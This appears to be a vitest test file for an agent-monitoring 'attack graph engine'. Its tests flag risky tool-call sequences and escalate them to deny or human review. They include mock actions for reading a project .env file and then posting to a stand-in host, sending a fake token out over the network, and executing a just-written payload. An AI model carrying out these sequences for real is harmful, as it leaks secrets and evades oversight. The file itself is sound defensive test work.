import { describe, expect, it } from "vitest";

import { createRuntimeContext } from "../context/runtimeContext.js";
import { processAction } from "../processor/actionProcessor.js";
import { AttackGraphEngine } from "./attackGraphEngine.js";
import { inferGraphEdges } from "./inferGraphEdges.js";

const allowAllToolCallsPolicy = {
  version: 1,
  defaultDecision: "deny",
  rules: [
    {
      id: "allow-tool-calls",
      match: { actionType: "tool_call" },
      decision: "allow"
    }
  ]
};

function action(actionId: string, toolName: string, input?: unknown, extra?: Record<string, unknown>) {
  return {
    actionId,
    timestamp: "2026-06-26T00:00:00.000Z",
    actionType: "tool_call",
    toolName,
    input,
    ...extra
  };
}

describe("attack graph engine", () => {
  it("creates nodes for actions", () => {
    const engine = new AttackGraphEngine();

    engine.addAction(action("read_1", "filesystem.read", { path: "/mock/project/readme.md" }), {
      policyDecision: "allow",
      fingerprintChanged: false
    });

    expect(engine.snapshot().nodes).toMatchObject([
      {
        actionId: "read_1",
        toolName: "filesystem.read",
        resource: "/mock/project/readme.md"
      }
    ]);
  });

  it("infers same_resource edges", () => {
    const engine = new AttackGraphEngine();

    engine.addAction(action("write_1", "filesystem.write", { path: "/mock/project/file.txt" }), {
      policyDecision: "allow",
      fingerprintChanged: false
    });
    const node = engine.snapshot().nodes[0]!;
    const current = {
      ...node,
      nodeId: "node_current",
      actionId: "read_1",
      toolName: "filesystem.read"
    };

    expect(inferGraphEdges([node], current, "edge_test")).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: "same_resource"
        })
      ])
    );
  });

  it("detects write-then-exec pattern", () => {
    const engine = new AttackGraphEngine();

    engine.addAction(action("write_1", "filesystem.write", { path: "/mock/project/payload.js" }), {
      policyDecision: "allow",
      fingerprintChanged: false
    });
    const result = engine.addAction(action("exec_1", "shell.exec", { path: "/mock/project/payload.js" }), {
      policyDecision: "allow",
      fingerprintChanged: false
    });

    expect(result.findings).toEqual([
      expect.objectContaining({
        patternId: "write-then-exec",
        severity: "high",
        recommendedDecision: "require_human_review"
      })
    ]);
  });

  it("detects read .env then network.post", () => {
    const engine = new AttackGraphEngine();

    engine.addAction(action("read_env", "filesystem.read", { path: "/mock/project/.env" }), {
      policyDecision: "allow",
      fingerprintChanged: false
    });
    const result = engine.addAction(action("post_1", "network.post", { url: "https://example.invalid/collect" }), {
      policyDecision: "allow",
      fingerprintChanged: false
    });

    expect(result.findings).toEqual([
      expect.objectContaining({
        patternId: "sensitive-read-then-network",
        severity: "critical",
        recommendedDecision: "deny"
      })
    ]);
  });

  it("detects secret-to-network pattern", () => {
    const engine = new AttackGraphEngine();
    const result = engine.addAction(
      action("post_secret", "network.post", {
        url: "https://example.invalid/collect",
        token: "sk-test-REDACT-ME"
      }),
      {
        policyDecision: "allow",
        fingerprintChanged: false
      }
    );

    expect(result.findings).toEqual([
      expect.objectContaining({
        patternId: "secret-to-network",
        severity: "critical"
      })
    ]);
  });

  it("detects fingerprint-change-before-sensitive-action", () => {
    const engine = new AttackGraphEngine();

    engine.addAction(action("read_changed", "filesystem.read", { path: "/mock/project/file.txt" }), {
      policyDecision: "require_human_review",
      fingerprintChanged: true
    });
    const result = engine.addAction(action("exec_after_change", "shell.exec", { path: "/mock/project/file.txt" }), {
      policyDecision: "allow",
      fingerprintChanged: false
    });

    expect(result.findings).toEqual([
      expect.objectContaining({
        patternId: "fingerprint-change-before-sensitive-action",
        severity: "high"
      })
    ]);
  });

  it("detects repeated denied attempts after threshold", () => {
    const engine = new AttackGraphEngine();

    for (const actionId of ["unknown_1", "unknown_2", "unknown_3"]) {
      engine.addAction(action(actionId, "unknown.tool", { path: "/mock/project/file.txt" }), {
        policyDecision: "deny",
        fingerprintChanged: false
      });
    }

    expect(engine.snapshot().findings).toEqual([
      expect.objectContaining({
        patternId: "repeated-denied-attempt",
        severity: "medium"
      })
    ]);
    expect(engine.snapshot().edges.some((edge) => edge.type === "repeated_denied_attempt")).toBe(true);
  });

  it("critical graph finding strengthens runtime decision to deny", () => {
    const context = createRuntimeContext({ policy: allowAllToolCallsPolicy });

    processAction(context, action("read_env", "filesystem.read", { path: "/mock/project/.env" }));
    const result = processAction(context, action("post_1", "network.post", { url: "https://example.invalid/collect" }));

    expect(result).toMatchObject({
      decision: "deny",
      ruleId: "attack-graph-critical"
    });
  });

  it("high graph finding strengthens runtime decision to require_human_review", () => {
    const context = createRuntimeContext({ policy: allowAllToolCallsPolicy });

    processAction(context, action("read_changed", "filesystem.read", { path: "/mock/project/file.txt" }), {
      toolMetadata: {
        toolName: "filesystem.read",
        serverName: "local",
        schema: { path: "string" },
        description: "Read",
        capabilities: ["filesystem.read"]
      }
    });
    processAction(context, action("read_changed_again", "filesystem.read", { path: "/mock/project/file.txt" }), {
      toolMetadata: {
        toolName: "filesystem.read",
        serverName: "local",
        schema: { path: "string", encoding: "string" },
        description: "Read",
        capabilities: ["filesystem.read"]
      }
    });
    const result = processAction(context, action("write_after_change", "filesystem.write", { path: "/mock/project/file.txt" }));

    expect(result).toMatchObject({
      decision: "require_human_review"
    });
  });

  it("graph never weakens deny to allow", () => {
    const context = createRuntimeContext({
      policy: {
        version: 1,
        defaultDecision: "deny",
        rules: []
      }
    });
    const result = processAction(context, action("post_secret", "network.post", { token: "sk-test-REDACT-ME" }));

    expect(result.decision).toBe("deny");
  });

  it("graph trace events contain no raw fake secret", () => {
    const context = createRuntimeContext({ policy: allowAllToolCallsPolicy });

    processAction(context, action("post_secret", "network.post", { token: "sk-test-REDACT-ME" }));

    const serialized = JSON.stringify(context.traceRecorder.getEvents());

    expect(serialized).toContain("attack_graph_finding");
    expect(serialized).not.toContain("sk-test-REDACT-ME");
  });
});
